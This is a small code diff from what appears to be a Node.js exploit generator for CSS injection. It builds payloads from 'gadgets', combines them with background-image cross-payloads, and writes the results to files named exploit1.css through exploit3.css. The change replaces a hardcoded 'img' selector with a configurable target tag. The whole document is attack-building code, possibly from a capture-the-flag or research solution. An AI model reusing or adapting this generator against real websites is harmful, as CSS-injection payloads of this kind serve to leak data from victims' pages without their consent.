@@ -39,9 +39,9 @@ const { payload: payload1, crossPayload: crossPayload1 } = generatePayload(gadge
 const { payload: payload2, crossPayload: crossPayload2 } = generatePayload(gadgets2)
 const { payload: payload3, crossPayload: crossPayload3 } = generatePayload(gadgets3)
 
-const finalPayload1 = `${payload1} img { display: block } img { background-image: ${crossPayload1}}`
-const finalPayload2 = `${payload2}img:after { content: 'a'; display: block; background-image: ${crossPayload2} }`
-const finalPayload3 = `${payload3}img:before { content: 'a'; display: block; background-image: ${crossPayload3} }`
+const finalPayload1 = `${payload1} ${target_tag} { display: block } img { background-image: ${crossPayload1}}`
+const finalPayload2 = `${payload2}${target_tag}:after { content: 'a'; display: block; background-image: ${crossPayload2} }`
+const finalPayload3 = `${payload3}${target_tag}:before { content: 'a'; display: block; background-image: ${crossPayload3} }`
 
 fs.writeFileSync('exploit1.css', finalPayload1, 'utf-8')
 fs.writeFileSync('exploit2.css', finalPayload2, 'utf-8')
